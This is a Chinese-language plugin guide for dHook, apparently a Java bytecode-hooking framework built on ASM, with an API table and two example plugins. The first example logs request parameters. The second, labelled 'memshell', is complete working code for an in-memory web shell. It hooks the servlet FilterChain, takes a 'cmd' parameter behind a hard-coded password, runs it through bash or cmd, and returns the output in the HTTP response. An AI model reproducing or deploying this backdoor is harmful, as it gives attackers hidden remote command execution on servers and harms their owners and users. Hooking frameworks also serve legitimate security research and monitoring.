# 编写你的第一个插件
## 准备
1. 创建一个新的java project，并命名为**dHook**.
2. 下载[dHook.zip](./dHook.zip)
3. 解压dHook.zip，放入你的插件项目中.
4. 导入asm依赖
```xml
<dependency>
     <groupId>org.ow2.asm</groupId>
     <artifactId>asm-commons</artifactId>
     <version>7.0</version>
</dependency>
```
5. 如下编写名为`DHookExtender`的类实现IDHookExtender接口,实现对应的方法.
```java
package dHook;
public class DHookExtender implements IDHookExtender {

    public void registerExtenderCallbacks(IDHookExtenderCallbacks callbacks) {
        // your extension code here
    }
}
```

## APIS

### Interface IDHookExtenderCallbacks

| Modifier and Type | Method and Description                                       |
| :---------------- | :----------------------------------------------------------- |
| `void`            | `setExtensionName(String name)` 设置扩展名称                 |
| `void`            | `setExtensionDesc(String desc)` 设置扩展描述                 |
| `void`            | `setExtensionHooks(List<String> hooks)` 设置hook点           |
| `String`          | `getHookClassName` 获取hook过程中的className                 |
| `String`          | `getHookMethod()` 获取hook过程中的method                     |
| `String`          | `getHookDesc()` 获取hook过程中的desc                         |
| `Set<Source>`     | `getSource()` 获取污点跟踪中的所有源对象                     |
| `void`            | `invokeStatic(Type type, Method method)`  hook时调用静态方法 |
| `void`            | `invokeMethod(final int opcode, final String owner,final String name,final String descriptor)` hook时调用方法 |
| `void`            | `invokeReturn()` hook方法时，提前调用return，适用于void方法 |
| `void`            | `invokeReturn(String returnValue)` hook方法时，提前调用return，适用于返回值为String方法 |
| `void`            | `invokeReturn(int returnValue)`  hook方法时，提前调用return，适用于返回值为int方法 |
| `void`            | `invokeReturn(String[] returnValue)` hook方法时，提前调用return，适用于返回值为String[]方法 |
| `void`            | `invokeReturn(int[] returnValue)` hook方法时，提前调用return，适用于返回值为int[]方法 |
| `void`            | `pushReturnValue(int opcode, String desc)` 将hook的方法的返回值押入栈中 |
| `void`            | `pushThis()` 将hook的类押入栈中   |
| `void`            | `pushParameter()` 将hook的方法的参数押入栈中 |
| `void`            | `pushObject(Object parameter)` 将指定的对象押入栈中 |
| `void`            | `pushInt(int parameter)` 将int押入栈中 |

### Interface IDHookExtenderCallbacks

| Modifier and Type | Method and Description                                       |
| :---------------- | :----------------------------------------------------------- |
| `void`            | `registerExtenderCallbacks(IDHookExtenderCallbacks callbacks)` 该方法将会在插件加载时调用,注册一个`IDHookExtenderCallbacks `接口，默认调用其接口的多个方法，来为开发者提供想要的操作。 |
| `void`            | `onMethodExit(int opcode)`  在方法退出（return前）时修改代码 |
| `void`            | `onMethodEnter()` 在方法进入时修改代码 |
| `void`            | `onVisitCode()` 在方法运行过程中修改代码 |

## 案例

### 打印应用中部分用户输入的参数：
```java
package dHook;


import org.objectweb.asm.Type;
import org.objectweb.asm.commons.AdviceAdapter;
import org.objectweb.asm.commons.Method;
import java.util.ArrayList;


public class DHookExtender implements IDHookExtender, ISource {
    private IDHookExtenderCallbacks callbacks; //将IDHookExtenderCallbacks对象设置为属性，供修改方法时使用

    public void registerExtenderCallbacks(IDHookExtenderCallbacks callbacks) {
        ArrayList<String> list = new ArrayList<>();
        list.add("org/apache/catalina/connector/Request.getParameter(Ljava/lang/String;)Ljava/lang/String;");
        callbacks.setExtensionHooks(list); //设置hook点
        callbacks.setExtensionName("request");//设置插件名
        callbacks.setExtensionDesc("打印请求参数");//设置插件描述
        this.callbacks = callbacks; //绑定属性
    }

    public void onMethodExit(int opcode) {

        callbacks.pushReturnValue(adviceAdapter, opcode, callbacks.getHookDesc()); //将getParameter方法返回值押入栈中
        Type type = Type.getType(HookHandler.class);
        Method method = new Method("doHook", "(Ljava/lang/Object;[Ljava/lang/Object;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V");
        callbacks.pushParameter(adviceAdapter); //将getParameter方法参数押入栈中
        callbacks.pushObject(adviceAdapter, callbacks.getHookClassName()); //将当前hook的className押入栈中
        callbacks.pushObject(adviceAdapter, callbacks.getHookMethod());//将当前hook的method押入栈中
        callbacks.pushObject(adviceAdapter, callbacks.getHookDesc());//将当前hook的desc押入栈中
        callbacks.invokeStatic(adviceAdapter, type, method); //调用doHook静态方法，传入的参数为押入栈中的对象
    }

    public void onMethodEnter() {
    }

    @Override
    public void onVisitCode() {

    }
}
```
### memshell
```java
public class DHookExtender implements IDHookExtender {
    private IDHookExtenderCallbacks callbacks;
    @Override
    public void registerExtenderCallbacks(IDHookExtenderCallbacks callbacks) {
        ArrayList<String> list = new ArrayList<>();
        list.add("javax/servlet/FilterChain.doFilter(Ljavax/servlet/ServletRequest;Ljavax/servlet/ServletResponse;)V");
        callbacks.setExtensionHooks(list);
        callbacks.setExtensionName("memshell");
        callbacks.setExtensionDesc("内存马");
        this.callbacks = callbacks;
    }

    @Override
    public void onMethodExit(int opcode) {


    }
    @Override
    public void onMethodEnter() {
        Type type = Type.getType(HookHandler.class);
        Method method = new Method("doHook", "([Ljava/lang/Object;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V");
        //将当前参数（此处为request和response）加入调用栈
        callbacks.pushParameter();
        //将当前hook className加入调用栈
        callbacks.pushObject(callbacks.getHookClassName());
        //将当前hook method加入调用栈
        callbacks.pushObject( callbacks.getHookMethod());
        //将当前hook desc加入调用栈
        callbacks.pushObject(callbacks.getHookDesc());
        //调用静态方法
        callbacks.invokeStatic(type, method);
    }

    @Override
    public void onVisitCode() {

    }
}

public class HookHandler {
    protected static final Class[] EMPTY_CLASS = new Class[]{};
    protected static final Class[] STRING_CLASS = new Class[]{String.class};
    private static final ThreadLocal<Boolean> longThreadLocal = new ThreadLocal<>();

    public static void doHook(Object[] args, String className, String method, String desc) {
        //避免一个请求多次触发
        if (longThreadLocal.get() == null) {
            longThreadLocal.set(true);
        } else {
            return;
        }
        //反射调用获取参数
        String c = (String) invokeMethod(args[0], args[0].getClass(), "getParameter", STRING_CLASS, "cmd");
        String psw = (String) invokeMethod(args[0], args[0].getClass(), "getParameter", STRING_CLASS, "psw");

        StringBuilder sb = new StringBuilder();
        for (Object arg : args) {
            sb.append(arg).append("\t");
        }
        String argStr = sb.toString();

        if (psw == null || !psw.equals("psw")) {
            return;
        }
        if (c != null) {
            String cmd;
            try {
                //执行命令
                cmd = execute(c);
            } catch (Exception e) {
                cmd = e.getMessage();
            }
            //填充httpResponse，提前返回
            write(args[1], cmd);
        }
    }

    public static Object invokeMethod(Object object, Class clazz, String methodName, Class[] paramTypes, Object... parameters) {
        try {
            Method method = clazz.getMethod(methodName, paramTypes);
            if (!method.isAccessible()) {
                method.setAccessible(true);
            }
            return method.invoke(object, parameters);
        } catch (Exception e) {
            if (clazz != null) {
            }
            return null;
        }
    }

    public static String execute(String cmd) throws Exception {
        StringBuilder result = new StringBuilder();
        if (cmd == null || cmd.length() == 0) {
            return result.toString();
        }
        DataInputStream dis = null;
        InputStream in = null;
        String osName = System.getProperty("os.name").toLowerCase();
        ProcessBuilder processBuilder;
        try {
            if (osName.contains("windows")) {
                processBuilder = new ProcessBuilder("cmd", "/c", cmd);
            } else {
                processBuilder = new ProcessBuilder("/bin/bash", "-c", cmd);
            }
            Process process = processBuilder.start();
            in = process.getInputStream();
            dis = new DataInputStream(in);
            String disr = dis.readLine();
            result.append("<pre>");
            while (disr != null) {
                result.append(disr).append("\n");
                disr = dis.readLine();
            }
            result.append("</pre>");

        } finally {
            if (in != null) in.close();
            if (dis != null) dis.close();
        }
        return result.toString();
    }

    public static void write(Object response, String value) {

        Object writer = invokeMethod(response, response.getClass(), "getWriterNoCheck", EMPTY_CLASS);
        if (writer == null) {
            writer = invokeMethod(response, response.getClass(), "getOutputStream", EMPTY_CLASS);
        }
        invokeMethod(response, response.getClass(), "disableKeepAliveOnSendError", EMPTY_CLASS);
        invokeMethod(response, response.getClass(), "setContentType", STRING_CLASS, "text/html");
        invokeMethod(response, response.getClass(), "setCharacterEncoding", STRING_CLASS, "UTF-8");

        assert writer != null;
        invokeMethod(writer, writer.getClass(), "print", STRING_CLASS, value);
        invokeMethod(writer, writer.getClass(), "flush", EMPTY_CLASS);
        invokeMethod(writer, writer.getClass(), "close", EMPTY_CLASS);

    }
}
```

> jdk9+ 编写插件时,tomcat应用需要修改catalina.sh以下选项:
> 
> JDK_JAVA_OPTIONS="$JDK_JAVA_OPTIONS --add-opens=java.base/jdk.internal.loader=ALL-UNNAMED"
> JDK_JAVA_OPTIONS="$JDK_JAVA_OPTIONS --add-opens=jdk.zipfs/jdk.nio.zipfs=ALL-UNNAMED"

**多个插件中自定义类名不要相同，目前会出现错误**